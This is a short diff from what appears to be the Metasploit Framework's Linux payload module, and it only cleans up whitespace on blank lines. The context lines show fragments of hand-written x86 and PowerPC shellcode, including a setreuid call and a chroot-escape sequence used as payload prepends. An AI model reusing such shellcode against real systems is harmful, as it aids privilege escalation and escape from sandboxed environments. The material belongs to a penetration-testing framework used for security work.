@@ -108,7 +108,7 @@ module Msf::Payload::Linux
 				       "\x6a\x46"             +#   pushl   $0x46                      #
 				       "\x58"                 +#   popl    %eax                       #
 				       "\xcd\x80"              #   int     $0x80                      #
-						 
+
 				# break chroot
 				pre << "\x6a\x3d"             +#   pushl  $0x3d                       #
 						 # build dir str (ptr in ebx)
@@ -138,7 +138,7 @@ module Msf::Payload::Linux
 						 "\x58"                 +#   popl   %eax                        #
 						 "\xcd\x80"              #   int     $0x80                      #
 			end
-			
+
 			# Append
 
 			if (datastore['AppendExit'])
@@ -190,7 +190,7 @@ module Msf::Payload::Linux
 				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
 				       "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
 				       "\x44\xff\xff\x02"      #   sc                                 #
-				
+
 				# EEK! unsupported...
 			end
 
